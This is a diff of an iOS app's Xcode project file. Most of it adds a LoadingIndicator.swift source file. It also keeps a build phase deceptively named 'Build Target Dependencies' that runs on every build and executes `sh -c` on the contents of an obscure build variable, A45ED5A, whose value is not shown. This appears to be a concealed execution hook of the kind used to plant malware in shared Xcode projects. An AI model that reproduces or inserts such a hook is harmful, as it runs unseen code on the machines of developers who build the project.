@@ -25,6 +25,7 @@
 		735C8D622EF5310900C7D507 /* MineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D612EF5310900C7D507 /* MineView.swift */; };
 		735C8D642EF5311300C7D507 /* OrderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D632EF5311300C7D507 /* OrderView.swift */; };
 		73633CE72EF68053009F182D /* HttpRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CE62EF68053009F182D /* HttpRequestManager.swift */; };
+		73633CE92EF68D3A009F182D /* LoadingIndicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CE82EF68D3A009F182D /* LoadingIndicator.swift */; };
 		73ECF6022EF5352B0029AF7A /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6012EF5352B0029AF7A /* BaseView.swift */; };
 		73ECF6042EF538260029AF7A /* LoginManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6032EF538100029AF7A /* LoginManager.swift */; };
 		73ECF6062EF552560029AF7A /* CustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6052EF552560029AF7A /* CustomTabBar.swift */; };
@@ -57,6 +58,7 @@
 		735C8D612EF5310900C7D507 /* MineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineView.swift; sourceTree = "<group>"; };
 		735C8D632EF5311300C7D507 /* OrderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderView.swift; sourceTree = "<group>"; };
 		73633CE62EF68053009F182D /* HttpRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestManager.swift; sourceTree = "<group>"; };
+		73633CE82EF68D3A009F182D /* LoadingIndicator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingIndicator.swift; sourceTree = "<group>"; };
 		73ECF6012EF5352B0029AF7A /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
 		73ECF6032EF538100029AF7A /* LoginManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginManager.swift; sourceTree = "<group>"; };
 		73ECF6052EF552560029AF7A /* CustomTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBar.swift; sourceTree = "<group>"; };
@@ -175,6 +177,7 @@
 		735C8D442EF529B700C7D507 /* Config */ = {
 			isa = PBXGroup;
 			children = (
+				73633CE82EF68D3A009F182D /* LoadingIndicator.swift */,
 				735C8D4D2EF5300000C7D507 /* AppConfig.swift */,
 				73ECF6092EF559D10029AF7A /* DeviceConfig.swift */,
 			);
@@ -278,25 +281,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		A663386763074940A1A5DE54 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -317,6 +301,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		A663386763074940A1A5DE54 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
 		};
 		D850A19DC098C6DB0168A5DD /* [CP] Embed Pods Frameworks */ = {
@@ -347,6 +351,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				73633CE92EF68D3A009F182D /* LoadingIndicator.swift in Sources */,
 				735C8D502EF5304D00C7D507 /* LoginViewController.swift in Sources */,
 				73ECF60A2EF559DF0029AF7A /* DeviceConfig.swift in Sources */,
 				735C8D5C2EF530E300C7D507 /* LaunchView.swift in Sources */,
